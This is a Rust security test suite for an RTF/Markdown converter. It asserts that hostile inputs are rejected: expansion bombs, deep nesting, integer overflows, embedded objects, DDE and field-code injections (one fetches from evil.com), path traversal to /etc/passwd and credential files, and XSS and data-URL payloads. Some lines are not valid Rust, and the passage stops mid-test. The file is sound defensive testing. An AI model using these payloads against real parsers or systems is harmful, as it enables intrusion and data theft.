// Malicious input test suite for RTF/Markdown conversion security
//
// This module tests the system's resilience against various attack vectors
// including DoS, memory exhaustion, code injection, and path traversal.

#[cfg(test)]
mod malicious_input_tests {
    use crate::conversion::{
        rtf_to_markdown, markdown_to_rtf,
        secure_parser::SecureRtfParser,
        rtf_lexer::tokenize,
        input_validation::InputValidator,
    };
    use crate::conversion::types::ConversionError;
    use std::path::Path;

    // ==================== DoS Attack Tests ====================

    #[test]
    fn test_billion_laughs_attack() {
        // Exponential expansion attack (XML bomb equivalent for RTF)
        let malicious_rtf = r"{\rtf1 
            {\*\lol1 lololololololololololololololol}
            {\*\lol2 {\*\lol1}{\*\lol1}{\*\lol1}{\*\lol1}}
            {\*\lol3 {\*\lol2}{\*\lol2}{\*\lol2}{\*\lol2}}
            {\*\lol4 {\*\lol3}{\*\lol3}{\*\lol3}{\*\lol3}}
            {\*\lol5 {\*\lol4}{\*\lol4}{\*\lol4}{\*\lol4}}
            {\*\lol6 {\*\lol5}{\*\lol5}{\*\lol5}{\*\lol5}}
            {\*\lol7 {\*\lol6}{\*\lol6}{\*\lol6}{\*\lol6}}
            {\*\lol8 {\*\lol7}{\*\lol7}{\*\lol7}{\*\lol7}}
            {\*\lol9 {\*\lol8}{\*\lol8}{\*\lol8}{\*\lol8}}
            {\*\lol9}
        }";
        
        let result = rtf_to_markdown(malicious_rtf);
        assert!(result.is_err(), "Billion laughs attack should be blocked");
    }

    #[test]
    fn test_deep_nesting_stack_overflow() {
        // Attempt to cause stack overflow with deep nesting
        let mut rtf = String::from(r"{\rtf1 ");
        
        // Create 10,000 nested groups
        for _ in 0..10_000 {
            rtf.push('{');
        }
        rtf.push_str("BOOM");
        for _ in 0..10_000 {
            rtf.push('}');
        }
        rtf.push('}');
        
        let result = tokenize(&rtf).and_then(|tokens| SecureRtfParser::parse(tokens));
        assert!(result.is_err());
        
        if let Err(e) = result {
            let error_msg = e.to_string();
            assert!(
                error_msg.contains("nesting") || error_msg.contains("depth"),
                "Error should mention nesting/depth limit"
            );
        }
    }

    #[test]
    fn test_memory_exhaustion_large_text() {
        // Attempt to allocate excessive memory with huge text chunks
        let huge_text = "A".repeat(100_000_000); // 100MB of 'A's
        let malicious_rtf = format!(r"{{\rtf1 {}}}", huge_text);
        
        let validator = InputValidator::new();
        let result = validator.pre_validate_rtf(&malicious_rtf);
        assert!(result.is_err(), "Huge input should be rejected");
    }

    #[test]
    fn test_recursive_group_bomb() {
        // Recursive group references that could cause infinite loop
        let malicious_rtf = r"{\rtf1
            {\stylesheet{\s1 \snext1 Style1;}}
            {\s1 {\s1 {\s1 {\s1 {\s1 Recursive Style}}}}}
        }";
        
        let result = rtf_to_markdown(malicious_rtf);
        // Should either error or complete without hanging
        assert!(
            result.is_err() || result.unwrap().len() < 1000,
            "Recursive references should be handled safely"
        );
    }

    // ==================== Integer Overflow Tests ====================

    #[test]
    fn test_integer_overflow_font_size() {
        // Attempt integer overflow with huge font size
        let malicious_rtf = r"{\rtf1 \fs999999999999999999 Huge font}";
        
        let result = tokenize(malicious_rtf);
        assert!(result.is_err(), "Integer overflow in font size should be caught");
        
        if let Err(e) = result {
            let error_msg = e.to_string();
            assert!(
                error_msg.contains("overflow") || error_msg.contains("number") || error_msg.contains("range"),
                "Error should mention overflow or invalid number"
            );
        }
    }

    #[test]
    fn test_negative_overflow() {
        // Test negative integer overflow
        let malicious_rtf = r"{\rtf1 \li-999999999999999999 Negative indent}";
        
        let result = tokenize(malicious_rtf);
        assert!(result.is_err(), "Negative overflow should be caught");
    }

    #[test]
    fn test_max_int_parameters() {
        // Test parameters at i32 boundaries
        let test_cases = vec![
            format!(r"{{\rtf1 \fs{} text}}", i32::MAX),
            format!(r"{{\rtf1 \li{} text}}", i32::MIN),
            r"{\rtf1 \fs2147483648 text}".to_string(), // i32::MAX + 1
            r"{\rtf1 \li-2147483649 text}".to_string(), // i32::MIN - 1
        ];
        
        for rtf in test_cases {
            let result = tokenize(&rtf);
            assert!(
                result.is_err() || {
                    if let Ok(tokens) = result {
                        SecureRtfParser::parse(tokens).is_err()
                    } else {
                        true
                    }
                },
                "Boundary value {} should be handled safely", rtf
            );
        }
    }

    // ==================== Code Injection Tests ====================

    #[test]
    fn test_embedded_object_injection() {
        // Attempt to embed executable object
        let malicious_rtf = r"{\rtf1 
            {\object\objemb\objw100\objh100
                {\*\objclass Word.Document.12}
                {\*\objdata 01050000020000000B0000004D534F52432E444C4C00}
            }
            Normal text
        }";
        
        let validator = InputValidator::new();
        let result = validator.pre_validate_rtf(malicious_rtf);
        assert!(result.is_err(), "Embedded objects should be blocked");
        
        if let Err(e) = result {
            assert!(e.to_string().contains("forbidden"), "Should mention forbidden pattern");
        }
    }

    #[test]
    fn test_field_code_injection() {
        // Attempt to inject malicious field codes
        let test_cases = vec![
            r"{\rtf1 {\field{\*\fldinst INCLUDETEXT 'C:\\malicious.exe'}}}",
            r"{\rtf1 {\field{\*\fldinst HYPERLINK 'javascript:alert(1)'}}}",
            r"{\rtf1 {\field{\*\fldinst DDE 'cmd' '/c calc.exe'}}}",
            r"{\rtf1 {\field{\*\fldinst IMPORT 'http://evil.com/payload'}}}",
        ];
        
        let validator = InputValidator::new();
        for malicious_rtf in test_cases {
            let result = validator.pre_validate_rtf(malicious_rtf);
            assert!(
                result.is_err(),
                "Field injection should be blocked: {}", malicious_rtf
            );
        }
    }

    #[test]
    fn test_pict_shellcode_injection() {
        // Attempt to inject shellcode via picture data
        let malicious_rtf = r"{\rtf1
            {\pict\picw100\pich100\picwgoal1000\pichgoal1000
                \bin 4D5A90000300000004000000FFFF0000B800000000000000
            }
        }";
        
        let validator = InputValidator::new();
        let result = validator.pre_validate_rtf(malicious_rtf);
        assert!(result.is_err(), "Picture injection should be blocked");
    }

    #[test]
    fn test_result_control_injection() {
        // Attempt to use \result to hide malicious content
        let malicious_rtf = r"{\rtf1
            Safe content
            {\result Hidden malicious content \object\objdata}
            More safe content
        }";
        
        let validator = InputValidator::new();
        let result = validator.pre_validate_rtf(malicious_rtf);
        assert!(result.is_err(), "\\result control word should be blocked");
    }

    // ==================== Path Traversal Tests ====================

    #[test]
    fn test_path_traversal_attacks() {
        let validator = InputValidator::new();
        
        let attack_vectors = vec![
            // Unix-style traversal
            "../../../etc/passwd",
            "../../../../etc/shadow",
            "../" . repeat(20) + "etc/hosts",
            
            // Windows-style traversal
            "..\\..\\..\\windows\\system32\\config\\sam",
            "..\\..\\..\\..\\boot.ini",
            
            // URL-encoded traversal
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            
            // Unicode encoding attempts
            "..%c0%af..%c0%af..%c0%afetc/passwd",
            "..%u2216..%u2216etc/passwd",
            
            // Null byte injection
            "../../../etc/passwd\0.rtf",
            "safe_file.rtf\0/../../etc/passwd",
            
            // Absolute paths
            "/etc/passwd",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "\\\\server\\share\\sensitive.rtf",
            
            // Symlink abuse attempts
            "./symlink/../../../target",
            
            // Mixed separators
            "..\\/..///..\\\\etc/passwd",
            
            // Long paths to bypass checks
            "a/" . repeat(100) + "../" . repeat(100) + "etc/passwd",
        ];
        
        for attack in attack_vectors {
            let result = validator.sanitize_path(&attack, Some(Path::new("/safe/dir")));
            assert!(
                result.is_err(),
                "Path traversal should be blocked: {}", attack
            );
        }
    }

    #[test]
    fn test_file_url_injection() {
        // Test file:// URL injection in various contexts
        let test_cases = vec![
            "file:///etc/passwd",
            "file://localhost/c:/windows/win.ini",
            "file:\\\\server\\share\\file.rtf",
        ];
        
        let validator = InputValidator::new();
        for attack in test_cases {
            let result = validator.sanitize_path(attack, None);
            assert!(
                result.is_err() || !result.unwrap().to_string_lossy().contains("file:"),
                "file:// URLs should be sanitized: {}", attack
            );
        }
    }

    // ==================== Markdown Injection Tests ====================

    #[test]
    fn test_markdown_xss_injection() {
        let validator = InputValidator::new();
        
        let xss_attempts = vec![
            "<script>alert('XSS')</script>",
            "<img src=x onerror='alert(1)'>",
            "<svg onload='alert(1)'>",
            "[Click me](javascript:alert('XSS'))",
            "[Innocent](vbscript:msgbox('XSS'))",
            "<iframe src='javascript:alert(1)'></iframe>",
            "<object data='javascript:alert(1)'></object>",
            "<embed src='javascript:alert(1)'>",
            "<form action='javascript:alert(1)'><input type='submit'></form>",
            "<a href='javascript:void(0)' onclick='alert(1)'>Click</a>",
            "<div style='background:url(javascript:alert(1))'>",
            "![](data:text/html,<script>alert('XSS')</script>)",
            "<meta http-equiv='refresh' content='0;javascript:alert(1)'>",
        ];
        
        for payload in xss_attempts {
            let result = validator.pre_validate_markdown(payload);
            assert!(
                result.is_err(),
                "XSS attempt should be blocked: {}", payload
            );
        }
    }

    #[test]
    fn test_markdown_data_url_injection() {
        let validator = InputValidator::new();
        
        let data_urls = vec![
            "![](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)",
            "[Link](data:application/x-executable;base64,TVqQAAMAAAAEAAAA)",
            "![](data:image/svg+xml,<svg onload='alert(1)'>)",
        ];
        
        for payload in data_urls {
            let result = validator.pre_validate_markdown(payload);
            assert!(
                result.is_err(),
                "Data URL should be blocked: {}", payload
            );
        }
    }

    // ==================== Unicode and Encoding Tests ====================

    #[test]
    fn test_unicode_normalization_attacks() {
        // Test various Unicode normalization attacks
        let test_cases = vec![
            // Homograph attacks
            "\\uc0\\u8206", // Zero-width space
            "\\u8203", // Zero-width joiner
            "\\u115F\\u1160\\u11A2", // Hangul filler characters
            
            // Overlong UTF-8 sequences (if processed incorrectly)
            "\u{FEFF}malicious", // BOM character
            "\u{200B}hidden\u{200B}text", // Zero-width spaces
        ];
        
        for case in test_cases {
            let rtf = format!(r"{{\rtf1 {}}}", case);
            // Should handle without crashing or exposing vulnerabilities
            let _ = rtf_to_markdown(&rtf);
        }
    }

    #[test]
    fn test_control_character_injection() {
        // Test injection of control characters
        let control_chars = vec![
            "\x00", "\x01", "\x02", "\x03", "\x04", "\x05", "\x06", "\x07",
            "\x08", "\x0B", "\x0C", "\x0E", "\x0F", "\x10", "\x11", "\x12",
            "\x13", "\x14", "\x15", "\x16", "\x17", "\x18", "\x19", "\x1A",
            "\x1B", "\x1C", "\x1D", "\x1E", "\x1F", "\x7F",
        ];
        
        let validator = InputValidator::new();
        for char in control_chars {
            let rtf = format!(r"{{\rtf1 Text{}Text}}", char);
            // Should either sanitize or reject
            let result = validator.pre_validate_rtf(&rtf);
            if result.is_ok() {
                let converted = rtf_to_markdown(&rtf);
                if let Ok(markdown) = converted {
                    assert!(
                        !markdown.contains(char),
                        "Control character should be sanitized: \\x{:02X}", 
                        char.as_bytes()[0]
                    );
                }
            }
        }
    }

    // ==================== Performance Attack Tests ====================

    #[test]
    fn test_regex_dos_patterns() {
        // Test patterns that could cause regex DoS
        let patterns = vec![
            "a" . repeat(100) + &"a?".repeat(100) + &"a".repeat(100),
            "(a+)+b",
            "(a*)*b",
            "(a|a)*b",
        ];
        
        for pattern in patterns {
            let rtf = format!(r"{{\rtf1 {}}}", pattern);
            // Should complete in reasonable time
            let start = std::time::Instant::now();
            let _ = rtf_to_markdown(&rtf);
            let duration = start.elapsed();
            
            assert!(
                duration.as_secs() < 5,
                "Pattern should not cause excessive processing time: {}", pattern
            );
        }
    }

    #[test]
    fn test_hash_collision_attack() {
        // Test potential hash collision in any internal hash maps
        // Using strings that might collide in weak hash functions
        let mut rtf = String::from(r"{\rtf1 ");
        
        // Add many similar keys that might collide
        for i in 0..10000 {
            rtf.push_str(&format!(r"\u{} ", i));
        }
        rtf.push_str("}");
        
        // Should handle without severe performance degradation
        let start = std::time::Instant::now();
        let _ = rtf_to_markdown(&rtf);
        let duration = start.elapsed();
        
        assert!(
            duration.as_secs() < 10,
            "Hash collision should not cause severe slowdown"
        );
    }

    // ==================== Combined Attack Tests ====================

    #[test]
    fn test_polyglot_attack() {
        // Test polyglot file that could be interpreted as multiple formats
        let polyglot = r"{\rtf1 
            %PDF-1.4
            <?xml version='1.0'?>
            <script>alert(1)</script>
            \object\objhtml
            GIF89a
            \bin4D5A90
        }";
        
        let validator = InputValidator::new();
        let result = validator.pre_validate_rtf(polyglot);
        assert!(
            result.is_err(),
            "Polyglot attacks should be detected"
        );
    }

    #[test]
    fn test_nested_encoding_attack() {
        // Test nested encoding attempts to bypass filters
        let nested = r"{\rtf1
            \u92